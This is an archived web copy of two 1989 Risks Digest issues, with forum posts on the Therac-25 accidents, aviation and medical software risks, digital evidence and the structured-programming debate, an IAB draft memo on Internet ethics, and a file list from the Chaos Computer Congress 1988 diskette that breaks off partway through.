Jerry Harper
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Re: Medical Software (Are computer risks different?)
</A>
</H3>
<address>
&lt;<A HREF="mailto:jon@june.cs.washington.edu">
jon@june.cs.washington.edu
</A>&gt;
</address>
<i>
15 Jan 1989 18:13:46 EST
</i><PRE>

&gt; (Regarding a posting on the Therac-25 radiation therapy accidents, Don
&gt; Alvarez writes)  ... The problem of testing and validating advanced 
&gt; hardware is not any way unique to computers.  (Then he gives examples
&gt; of accidents that might arise from people abusing non-computerized 
&gt; equipment: trimming hedges with electric lawn mowers and putting portable
&gt; radios in the shower).

I work in radiation therapy and just finished a lot of research on the Therac
accidents, and there are two points I would like to make:

First, the Therac accidents were *not* examples of people abusing equipment
contrary to instructions, as in the examples Don gives.  The accidents happened
because the machine included faults in software and, many would argue, 
additional design errors in the hardware which provided insufficient protection
against software faults.  It is arguable that the clinics do bear some 
responsibility also, because they continued to use the machines after they
had some evidence that there were problems with the machine --- but faults
in the machine were the source of the problem.

Second, are computer-controlled devices a *special problem*?  Overall, I
agree with Don that the problems of testing and validating machinery are
broadly similar whether the machinery includes a computer or not.  However,
we currently have a special problem with computer-controlled devices because
industry practices in software development are often much worse than for
other kinds of technology.   The Therac is a glaring example of this;
the physical design of the radiation-producing apparatus was considered
superb; the control system, and in particular the software (it is now clear)
were very poor, relative to the safety requirements of this application.
Therefore, I do not think that articles in the press (or RISKS postings)
devoted to this problem are in any way analogous to "blinders"; rather,
they are well-deserved attention to a problem that ought to be fixed.

In particular, it is very important to understand that people are not picking
on the Therac-25 just because the faults involved a computer.  This machine
was more dangerous than machines with similar functionality that were
not computer controlled, even the ones built by the same manufacturer.
The particular hazard manifested in the Therac accidents has been 
well-understood since a similar series of accidents with one of the first
(non-computerized) accelerators in 1966.  Evers since, this hazard has
been adequately handled in most machines by non-programmable hardwired
interlocks.

It is reasonable to expect that successive product generations that introduce
new technologies should represent progress overall.  When a new product
turns out to be *less* safe than its predecessors, that is newsworthy. 

- Jonathan Jacky, University of Washington

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Ground proximity warning
</A>
</H3>
<address>
Mark Brader 
&lt;<A HREF="mailto:msb@sq.sq.com">
msb@sq.sq.com
</A>&gt;
</address>
<i>
Sat, 14 Jan 89 03:18:58 EST
</i><PRE>
         [Gerald McBoeing-Boeing and the Near-Sighted McCrew?]

Path: sq!geac!yunexus!utzoo!utgpu!watmath!clyde!att!pacbell!ames!pasteur!
      agate!ucbvax!hplabs!hpda!hpcuhb!hpcilzb!bills
From: bills@hpcilzb.HP.COM (Bill Standerfer)
Newsgroups: rec.aviation                                  [with one typo fixed]
Subject: Boeing Sense of Humor?
Date: 10 Jan 89 16:37:33 GMT
Organization: HP Design Tech Center - Santa Clara, CA

I was paging through a recently acquired 727 manual and came across this little
gem of wisdom.  (GPWS is the ground proximity warning system.  It tells the
crew when the ground is getting too close for what they're doing.)

     "Note: the GPWS will not provide a warning if an airplane is flying
     directly towards a vertical cliff."

Gee, thanks.  I'll keep that in mind. :-}

Bill Standerfer, KG6FQ -- hplabs!hpdtc!bills -- bills%hpdtc@hplabs.hp.com
Hewlett Packard Design Technology Center
5301 Stevens Creek Blvd., Santa Clara, CA  95052 -- 408-553-3139
Restoration crew chief - B-29A and KC-97L - Castle Air Museum

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Aircraft
</A>
</H3>
<address>
Dale Worley
&lt;<A HREF="mailto:worley@compass.UUCP ">
worley@compass.UUCP 
</A>&gt;
</address>
<i>
Fri, 13 Jan 89 18:18:02 EST
</i><PRE>

In reply to Steve Philipson's remarks about aircraft, a friend once pointed out
to me that fighter aircraft are designed to a lower safety standard than
civilian aircraft, "because if 1 in 1000 crashes due to mechanical problems,
that's far less than are lost due to combat" -- as a matter of policy, some
safety is sacrificed for improved performance.

Mr. Philipson also wisely points out that people involved in technology should
point out to the public the risks associated with that technology, so that
intelligent policy debate can be carried out.  Unfortunately, new technology is
often sold as "risk-free", when it isn't.  Even more unfortunately, new
technology often won't be allowed by the public unless a (false) appearance of
no risk is maintained -- people reject new technologies on the basis of risks,
even if larger risks are already accepted in old technologies.  (A bizarre case
is AIDS in the United States -- the number of people who have ever died of AIDS
in the U.S. is less than the number who die yearly of motor vehicle accidents,
but we don't convene national commissions on motor vehicle accidents!)

Dale Worley, Compass, Inc.                      compass!worley@think.com

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
You don't know what you've got till it's gone.
</A>
</H3>
<address>
&lt;<A HREF="mailto:Agre@AI.AI.MIT.EDU">
Agre@AI.AI.MIT.EDU
</A>&gt;
</address>
<i>
Sun, 15 Jan 89 14:21 PST
</i><PRE>

By now we've seen several cases in which computer-based systems failed because
they did not implement features which had been implicit in the physical systems
they replaced.  Thus, for example, physical mechanisms do a great deal of
implicit sanity-checking, inasmuch as ten and ten thousand look much more
different when coded as angular velocities than when coded in binary.
Computational abstraction is attractive because it is less cumbersome than
physical realization, but cumbersomeness is very often a virtue in itself since
it assures that important parts of the world will tend to move at manageable
speeds.  Drawing up balance sheets of risks and benefits of various uses of
computer technology is a good and necessary thing.  The problem is that we've
always benefitted from the implicit virtues of physical objects without ever
having to articulate them.  The time to make a good, thorough list of these
virtues is now, before we've lost them for good.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Data integrity (Re: RISKS-8.5)
</A>
</H3>
<address>
Brent Laminack
&lt;<A HREF="mailto:brent@itm.UUCP ">
brent@itm.UUCP 
</A>&gt;
</address>
<i>
13 Jan 89 14:28:27 GMT
</i><PRE>
Organization: In Touch Ministries, Atlanta, GA

    A few random thoughts:

    Yes, the time is here when we can no longer believe photographs
we see published.  This even goes for the bastion of reliability:
The National Geographic.  At least two of their covers have been
digitaly retouched.  One was of two pyramids and a camel in the sunset.
One of the pyramids was moved over to fit the space requirements of
the cover.  Another cover was a photo of an old man somewhere in
the mid-east, I believe.  They liked his face, but also liked the
headdress another man was wearing, so they put the other headdress
on his head.  It looked real.  Painters have done this for years.
The Mona Lisa was a composite.  What is new is the technology for
doing it in a supposedly "trusted" medium.

    But this information is catching on.  A friend was in an auto
accident.  No one was hurt, but damage was done to the car.  One of
the parties took a Polaroid photo of the scene.  The attendant police
officer asked to see it.  He signed and dated it on the back.  Otherwise
he said it would be inadmissable as evidence.  His signature was there
to state that yes, that's the way things looked.

    As to evidence of computer crime, I believe U.S. Federal rules
regard whatever the computer prints out as "best evidence".  Scary.

    The intelligent gun brought to mind a friend who's an Electrical
Engineer.  An appliance manufacturer came to him to design an intelligent
toaster.  It has a knob on the front and an LED readout of the "brownness"
setting.  Unfortunately, all it is is a timer circuit that times how brown
the toast should be.  The old way of doing things (a bimetal strip)
had feedback from the active site.  Not so the new.  The intelligent
toaster with an open heating element will proudly pop up raw bread
after 90 seconds.  Worse yet, flaming toast could keep being heated 
until it's supposedly brown enough.

    On the computerization of hospitals, a friend of mine (who shall
obviously remain nameless) was working on software for a hospital.  One
project was the scheduling of IVs.  A typical regimen would be to administer
a unit of saline mixed with some drug every six hours.  i.e. noon, six p.m.,
midnight, six a.m., etc.  Daylight saving time then happened.  Being a good
UNIX system, it carried right on: noon, six p.m., midnight (time change)
seven a.m., 1 p.m., etc.  The hospital was up in arms.  They claimed the IVs
were an hour late.  My friend had to give in.  So now between the midnight
and six a.m.  doses, there may be five or seven hours depending on the time
change.  The administration wasn't particularly worried about over or under
medicating the patients.  Doses around 2 a.m. tend to get skipped.  Moral:
don't leave your money in the bank around the year 2000, and don't check
into a hospital around daylight savings time changeover.
                                                             brent laminack 

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Quality of Evidence
</A>
</H3>
<address>
&lt;<A HREF="mailto:WHMurray@DOCKMASTER.ARPA">
WHMurray@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Fri, 13 Jan 89 14:03 EST
</i><PRE>

&gt;Are we approaching the point (or have we reached it already?) where
&gt;truth is, for all practical purposes, whatever the computer says it is?
&gt;Where what is accepted as truth is easily manipulated by those who are
&gt;privileged to have access to the digital keepers of truth?

Recently, in an archeological excavation in the middle east, a large stone
tablet was unearthed.  Scholars determined that it was an ancient audit
report, complaining about the use of papyrus scrolls by the scribes.  It was
clear that such scrolls lacked the evidential integrity of stone and clay
tablets.

As recently as when I got into data processing, auditors were complaining
that punched cards lacked the integrity of ledger cards.  I had to work very
hard to convince the auditors that the new batch controls were equal to the
transaction-by-transaction controls to which they were accustomed.  There is
a cruel irony to the fact that I am still here to hear them complain about
the passing of batch controls and the return to transaction controls.

The more things change, the more they stay the same.  What goes around, comes
around.  Those who fail to heed the lessons of history, are doomed to repeat
them.

The same computers that enable us to manipulate records, also enable us to make
so many copies that no one person can alter them all.  The same computers that
enable us to digitize an analog record (e.g. a photograph), manipulate it, and
return it to analog, also enable us to create digital signatures to make any
such tampering obvious and the absence of such tampering equally obvious.

In the nineteenth century wills and contracts were expected to be hand written.
When the typewriter came along, they continued to be hand written for some time
for reasons of admissability as evidence.  Today, a hand written will is
suspicious.  Even though digitally signed wills and contracts are orders of
magnitude more difficult to forge than typewritten ones, type written documents
will like survive, even be preferred, for two more decades.

There was a time when the testimony from memory of the elders was preferred to
written records.

In this context, it is interesting to note that a vanishingly small number of
transactions are disowned.  Almost none are litigated.  A single forgery hardly
ever carries the day.  Hardly ever is the record of the contract at issue; it
is almost always the intent.

Written on the list of heresies and other words I try to live by, it says
"there is no truth, there are only hypothesies and evidence."  In the short
run, while we rethink our ideas of evidence yet again, the forgers may have a
field day.  I am not much worried for the long run.

William Hugh Murray, Fellow, Information System Security, Ernst &amp; Whinney
2000 National City Center Cleveland, Ohio 44114                          
21 Locust Avenue, Suite 2D, New Canaan, Connecticut 06840                

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
D.Robbins' conclusions (Authenticity of Information)
</A>
</H3>
<address>
Allan Pratt
&lt;<A HREF="mailto:apratt@atari.UUCP ">
apratt@atari.UUCP 
</A>&gt;
</address>
<i>
Fri, 13 Jan 89 11:57:40 pst
</i><PRE>

In RISKS volume 8 issue 5, Dave Robbins writes:

&gt; We have no practical means of verifying the integrity of 
&gt; such large volumes of information, and are thus left with no choice but 
&gt; to trust that the electronic records are accurate. 

On the contrary.  Our other choice is to REFUSE to trust the accuracy of
the records.  If there is a computer record of at $100,000 withdrawal
from my savings account, the bank does not have to trust the record. 
The computer record is circumstantial evidence: it might provide useful
insight for further investigation, but it is not to be trusted as
conclusive proof. 

&gt; It is wholly 
&gt; impractical, for example, for the Social Security Administration's 
&gt; entire data base (how many hundreds of millions of individual records?) 
&gt; to be manually audited to verify its accuracy.

It would be no less impractical if all that information were on 3x5"
cards.  When dealing with volumes of information like this, you accept a
certain RISK of fraud and error as the norm, and investigate (manually
audit) the most egregious cases.  You can't blame computers for causing this
situation, and I think you'll have to give them credit for helping
ameliorate it.

Opinions expressed above do not necessarily	-- Allan Pratt, Atari Corp.
reflect those of Atari Corp. or anyone else.	  ...ames!atari!apratt

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Risks of trusting the press
</A>
</H3>
<address>
Brad Templeton 
&lt;<A HREF="mailto:brad%looking.uucp@RELAY.CS.NET">
brad%looking.uucp@RELAY.CS.NET
</A>&gt;
</address>
<i>
Fri Jan 13 14:32:20 1989
</i><PRE>

The Hacker's Conference episode is just one of many.  Readers of USENET
last month closely followed attempts by the press to shut down my own
moderated newsgroup.  As in the CBS case, where you were "guaranteed" that
the story would put you in a good light, the reporter who interviewed me
acted in a very sympathetic manner.

Ha.

With most reporters I have encountered in this area, the fact is this:
If the reporter decides in advance that you're a wrongdoer, then just
about anything is ethical to get the story.  In particular, they will
pretend to agree with you and indicate that they are writing a favourable
story.   After all, it's not unethical to lie to criminals to get them to
expose themselves, is it?

This is general advice, but we must be particularly careful when it comes
to public exposure of modern technology.   People are predisposed to
fear it.  People are now predisposed to link hacker with criminal.  People
are predisposed to link "computer network" with "underground."
Watch out for this.  If you suspect the slightest bit of prejudice, clam
up.  Don't trust a word they say -- their motives are not yours.

The image of technology is very important to RISKS.  It controls what
technologies people will trust, and how they will trust them.

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Risks of Remote Student Registration: Another Interaction Story
</A>
</H3>
<address>
&lt;<A HREF="mailto:MCCLELLAND_G%CUBLDR@VAXF.COLORADO.EDU">
MCCLELLAND_G%CUBLDR@VAXF.COLORADO.EDU
</A>&gt;
</address>
<i>
Mon, 28 Nov 88 09:54 MDT
</i><PRE>

An anonymous contributor in <A HREF="/Risks/7.82.html">RISKS-7.82</A> notes the dangers of computer course
registration procedures using touchtone phones.  Our university also has the
same system and also uses the easily accessible SSN and birthdate as id's and
passwords.  Those risks are bad enough but I'm more fascinated by the risks
produced by the unexpected interaction among new computer technologies.  Our
university is much more concerned presently with getting computer registration
to work right than about security of the system.  Last semester, the system's
first run, many more students than anticipated had incomplete schedules because
the computer, not knowing any better, actually enforced prerequisites that had
long been ignored, blocked out the entire three hours scheduled for a lab that
everyone knew really only lasted one hours, etc.  This meant an astounding
number ("astounding" means about 30 times more than the system was designed to
handle) of students had to complete their schedules in a two-day period using
touchphones and a few scattered terminals to drop and add courses.  Of course,
most students trying to call the computer got busy signals.  Now here's the
interaction: not long ago the university also installed a fancy local switch
that gave all campus phones, including one in every dorm room, all sorts of
fancy features.  Not only was automatic redialing available, but also a cute
feature that calls you back when the busy line you are calling becomes free.
No telling how much of the switch's resources are required for that little
goodie.  The obvious outcome was that both the computer registration system AND
the campus phone network were brought to their knees.  Smart students then
figured out they were better off calling from off campus even without the
auto-redial features, but then the whole community phone system became
sluggish.
                                 Gary McClelland

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
 Medical information systems
</A>
</H3>
<address>
Jerry Harper 
&lt;<A HREF="mailto:jharper@euroies.UUCP">
jharper@euroies.UUCP
</A>&gt;
</address>
<i>
Fri, 6 Jan 89 12:29:32 GMT
</i><PRE>

A few weeks ago I mentioned the problems that the Irish Department of Health
had with the MCAUTO IRELAND installed system. I would be very grateful if
anyone reading this with experience of said system in the US would take the
trouble to email me their observations.  

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.06.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.08.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-58</DOCNO>
<DOCOLDNO>IA012-000131-B037-31</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.8.html 128.240.150.127 19970217024925 text/html 23518
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:47:54 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 8</TITLE>
<LINK REL="Prev" HREF="/Risks/8.07.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.09.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.07.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.09.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 8</H1>
<H2> Sunday 15 January 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Re: Losing systems -- and Structured Programming 
</A>
<DD>
<A HREF="#subj1.1">
Bruce Karsh
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Ethics of the Internet - Request for Comments 
</A>
<DD>
<A HREF="#subj2.1">
Cliff Stoll
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Chaos Computer Congress 1988 -- Documentation 
</A>
<DD>
<A HREF="#subj3.1">
Klaus Brunnstein
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Re: Losing systems -- and Structured Programming
</A>
</H3>
<address>
Bruce Karsh
&lt;<A HREF="mailto:karsh@sgi.com ">
karsh@sgi.com 
</A>&gt;
</address>
<i>
Fri, 13 Jan 89 06:30:42 PST
</i><PRE>

In a previous article, Vince Manis wonders about software project
failures and tries to figure out why they happen. 

     I can think, offhand, of a number of hypotheses to explain the
     continuing inability to deliver reliable, useful, on-budget software:
               [He gives 5 reasons...]
     Undoubtedly, the true answer is a mixture of these, along with others
     that I just can't think of at 4:45 am.

Well, it's 4:45 am here too, but I can propose at least one more hypothesis.
How about:

     6) The structured programming revolution is a real bad idea that has
        been significantly holding back progress for years.

Now, as I wait for the structured programming police to go after me, I'll
try to defend this statement.

First, isn't it just a little bit silly to think that making rules about
how programs are indented, whether or not to use goto statements, ...etc. will
really make a difference to a large software project.  A piece of software
can be perfectly indented, totally goto free, and absolutely positively wrong.
Likewise, it can be full of goto statements, line up as straight as a board
against the left column of the page, and still be provably correct.  In fact,
for any purported structured programming rule that I've ever heard of, I
propose that one could create a perfectly correct piece of software which
violates that rule.

So maybe the structured programming movement isn't really about correctness.
Maybe it's strong suit is helping us make maintainable software.  This may
or may not be true, but I've sure seen lots of purportedly structured programs
that were very difficult for me to maintain.  Likewise, I can conceive of
programs which would offend a structured programming supporter, but which
could quickly and easily be comprehended by a maintenance programmer.
Anyways, when you are selling into a competitive market of millions of end
users, maintaining software is impractical.  It has to be correct on
the first shipment and it can't really be changed once it's out there.  So
having a maintainable structured program really isn't all that useful.  Being
maintainable is just an excuse to be buggy.

Have there been any double blind studies which unambiguously show that
the kind of programs that structured programming partisans enjoy are
really more maintainable than some other kind of program?  I've heard
lots of testimonials, but no real evidence.

Maybe the structured programming movement is about allowing a group of
programmers to work together on a large project.  OK, but what REALLY happens
when a group of structured programmers tries to develop a large program?
Usually they argue about how the program should be indented, what the comments
should be like, how the subroutines should be nested, ... etc.  Often they
argue about those issues much more than they argue about things like how can
the algorithms be checked for correctness, how will the end users perceive the
programs, what should the program's performance be like ... etc.  You know, the
stuff that the customer cares about.

So maybe structured programming is about making programs run faster and
use less of the computer's resources?

Yes, structured programming techniques don't really improve correctness,
maintainability, usability or performance.  But the real problem with the
structured programming movement is that so many programmer believe
in it.  They believe that by following these techniques, they will produce
good programs.  It just isn't so.  Programming is much harder than that.

The RISK is that these programmers initiate projects based on the belief
that structured programming is the atomic bomb of the software war.  When
the structured programming techniques fail to make the problem easier,
and the programmers are confronted with the grim reality of how incredibly
much work it takes to make the project succeed, the project usually fails.

Occasionally, there are enough resources on the project that if the programmers
put in enough all night work sessions, they can just barely get the project out
before somebody pulls the plug on the whole thing.  Usually, during this
exercise, structured programming takes a back seat to getting the project
finished.  This is how successful software projects happen.  Programmers and
their all night programming sessions have become a national joke.

I don't know if we'll soon figure out how to make successful large systems.  As
far as I know, nobody's really got that completely figured out yet, or they'd
be turning out a flood of really great programs.  I haven't seen that flood
yet.  In the mean time, instead of structured programming, I have some other
ideas:

1) Concentrate much more on what the end user gets than on how structured
   the program is.  Don't let the user's view of the program happen by
   accident.  If the program is interactive, then everything counts here.
   For example, you even have to take into account the real-time behavior of
   the program.  Page faults or swapin/swapout are no excuse to an end user who
   is trying to get his work done and the system's performance isn't good.
   Everything that the user sees the program do is the program developer's
   responsibility.

2) Look closely at other people's attacks on the problem.  Very rarely are
   you the first or second to tackle any given problem.  Learn from others
   successes and mistakes.  Spend a lot of time reading other peoples code.

3) Rely on logical reasoning to decide whether or not something will work.
   Even if it's perfectly structured, it probably fails under some
   condition.  Use your mind and your logical reasoning skills to make
   sure that it doesn't.

4) Don't use algorithms that you don't understand.  First figure them
   out, then consider using them.  This is especially true of numerical
   methods.  It's not really a very good excuse to the end user to say
   that the reason that the software failed is because some supposedly
   black box procedure failed.  Understand black boxes.  Open them up
   when you can.

5) Don't kid yourself into thinking that you are sure about how a
   piece of software will behave when you really aren't sure.  If you
   aren't sure, the software is probably is wrong.  Go to step 3) above.

6) Take personal responsibility for every single character that you put
   into the source.  If something is wrong, and you put it there, then
   it's your fault.   ... even if it's perfectly well structured.

I'll end this note with a plea.  Let's let the structured programming movement
die.  The computer science field is too young to let that kind of stifling
pseudo-science suppress inovation.  We need to continue to experiment with
entirely new ways to structure programs.  The ones we have now are not good
enough.  Let a thousand new kinds of structuring bloom!

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
 Ethics of the Internet - Request for Comments
</A>
</H3>
<address>
Cliff Stoll
&lt;<A HREF="mailto:cliff@Csa5.LBL.Gov ">
cliff@Csa5.LBL.Gov 
</A>&gt;
</address>
<i>
Sun, 15 Jan 89 18:48:42 PST
</i><PRE>

Network Working Group							IAB
Request for Comments: PPPP				 January 1989
 
				Ethics and the Internet
 
Status of this Memo
 
This memo is a statement of policy by the Internet Activities
Board concerning the proper use of the resources of the Internet.
 
Introduction

At great human and economic cost, resources drawn from the U.S. and government,
industry and the academic community have been assembled into a collection of
interconnected networks called the Internet.  Begun as a vehicle for
experimental network research in the mid-1970's, the Internet has become an
important national infrastructure supporting an increasingly widespread,
multi-disciplinary community of researchers ranging, inter alia, from computer
scientists and electrical engineers to mathematicians, physicists, medical
researchers, chemists, astronomers and space scientists.

As is true of other common infrastructure (e.g. roads, water reservoirs and
delivery systems, and the power generation and distribution network), there is
widespread dependence on the Internet by its users for the support of
day-to-day research activities.

The reliable operation of the Internet and the responsible use of its resources
is of common interest and concern for its users, operators and sponsors. Recent
events involving the hosts on the Internet and in similar network
infrastructures underscore the need to reiterate the professional
responsibility every Internet user bears to colleagues and to the sponsors of
the system. To the extent that the Internet resources are provided by the U.S.
Government, this responsibility becomes a Federal matter above and beyond
simple professional ethics.
 
IAB Statement of Policy

The Internet is a national facility whose utility is largely a consequence of
its wide availability and accessibility.  Irresponsible use of this critical
resource poses an enormous threat to its continued availability to the
technical community.

The U.S. Government sponsors of this system have a fiduciary responsibility to
the Legislature to allocate government resources wisely and effectively.
Justification for the support of this system suffers when highly disruptive
abuses occur.  Access to and use of the Internet is a privilege and should be
treated as such by all users of this system.

The IAB strongly endorses the view of the Division Advisory Panel of the
National Science Foundation Division of Network, Communications Research and
Infrastructure which, in paraphrase, characterized as unethical and
unacceptable any activity which purposely:
 
	(a) seeks to gain unauthorized access to the resources of the Internet
        (b) disrupts the intended use of the Internet
	(c) wastes resources (people, capacity, computer) through such actions 
	(d) destroys the integrity of computer-based information
or	(e) compromises the privacy of users

The Internet exists in the general research milieu. Portions of it continue to
be used to support research and experimentation on networking. Because
experimentation on the Internet has the potential to affect all of its
components and users, researchers have the responsibility to exercise great
caution in the conduct of their work. Negligence in the conduct of
Internet-wide experiments is both irresponsible and unacceptable.

The IAB plans to take whatever actions it can, in concert with Federal agencies
and other interested parties, to identify and to set up technical and
procedural mechanisms to make the Internet more resistant to disruption. Such
security, however, is extremely expensive and may be counterproductive if it
inhibits the free flow of information which makes the Internet so valuable. In
the final analysis, the health and well-being of the Internet is the
responsibility of its users who must, uniformly, guard against abuses which
disrupt the system and threaten its long-term viability.
 
</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Chaos Computer Congress 1988 -- Documentation (More on RISKS-8.1)
</A>
</H3>
<address>
Klaus Brunnstein 
&lt;<A HREF="mailto:brunnstein%rz.informatik.uni-hamburg.dbp.de@RELAY.CS.NET">
brunnstein%rz.informatik.uni-hamburg.dbp.de@RELAY.CS.NET
</A>&gt;
</address>
<i>
11 Jan 89 18:23 GMT+0100
</i><PRE>

At the Congress, 48 electronic documents including position papers, 
agenda, press material etc. were available free of charge. Most of
the documents are in German (better: Anglo-German techno slang), but
several documents are translated in English, French, Swedish and 
Netherlandish, so people without German language knowledge may get
an impression of CCC'88 in their respective language (if available).

This document describes the content of the diskette which I received;
the electronic documents are essentially in ASCII, except in some
German documents where vowel-mutations appear.

Name, content and size of each documents are described below.
Content is either described by the headline or (if not available) by 
information selected from the texts (in parentheses), both in the 
respective language; in the German package, the content is also
described in English. The documents are collected in packages, and 
they are essentially unchanged (I only deleted many blank lines; 
special non-ASCII characters have not been changed).

You may get the package(s) either by e-mail or via traditional post
from my address (below).
                       [Note: in Byte counts, "." auf deutsch = "," in English;
                              in dates, 30.12 is 30 December.]

     Content of Chaos Computer Congress '88 diskette (ASCII files)
     =============================================================

     Package 1: The `Newspaper'/German/Size=51.840 Bytes  
     ---------------------------------------------------
     ALL.GER       ( 51.840 Bytes): Alle deutschen Texte/all German text

     Package 2: German documents/Size=61.261 Bytes
     ---------------------------------------------
      ARMENIEN2.GER (   923 Bytes): Armenienhilfe (Teil von ARMENIEN.GER) 
      ARMENIEN.GER  ( 2.176 Bytes): Armenienhilfe                  
      AUFTAKT.GER   ( 1.734 Bytes): ***AGENTUR*** Hackerkongress eroeffnet
      BIOFEED.GER   ( 2.125 Bytes): Vortrag: Neue Perspektiven der 
                                    Mensch-Maschine-Kommunikation 
                                    ueber Bio-Feedback (new perspectives
                                    in man-machine communication via
                                    bio-feedback)
      CCC1.GER      ( 3.388 Bytes): Wege zur Informationsgesellschaft
                                    (ways towards Information Society)
      COMKIND.GER   ( 1.363 Bytes): Kinder an die Computer - aber zuegig !!!
                                    (children should use more computers
                                    in school - now!!!)
      COMPOST.GER   ( 1.840 Bytes): Das Oekonetz COMPOST (CCCs econet)
      CRACK.GER     ( 1.748 Bytes): (Informationen ueber Cracker meeting)
                                    (inform.about cracker meeting,not CCC)
      DIARY28.GER   ( 4.933 Bytes): 88 Zusammenfassung CCC '88 (summary)
      DIEBE.GER     (   967 Bytes): Briefmarken fuer 59500 Mark weg
                                    (stamps stolen/ relation to CCC'88??)
      DONNERST      ( 1.405 Bytes): Congressfahrplan CCC'88 Donnerst 29.12.
                                    (time schedule Thursday, 29 December)
      EINDRUCK.GER  ( 3.749 Bytes): Erste Eindruecke zum CCC-Congress '88
                                    von Ralf Rudolph (first impressions)
      FIDO.GER      (   786 Bytes): Das FIDO Netz (report about FIDONET)
      FREITAG.GER   ( 1.037 Bytes): Congressfahrplan CCC'88 Freitag 30.12.
                                    (CCC time schedule Friday, 30 Dec)
      HACKER.GER    (   141 Bytes): (Hacker-Witz) [Hacker joke]
      LEIDEN.GER    ( 1.386 Bytes): `Die Leiden des Layouters' oder
                                    `Umlaute - die Letzte' (problems of
                                    layouting with vowel-mutation)
      MITTWOCH      ( 1.046 Bytes): Congressfahrplan CCC'88 Mittwoch 28.12.
                                    (CCC time schedule Wednesday, 28 Dec)
      NETZE.GER     (   885 Bytes): fido,zerberus,(btx-net) Vortrag/Disk.
                                    (CCC networks plans)
      PACKETRA.GER  ( 1.734 Bytes): Packet Radio
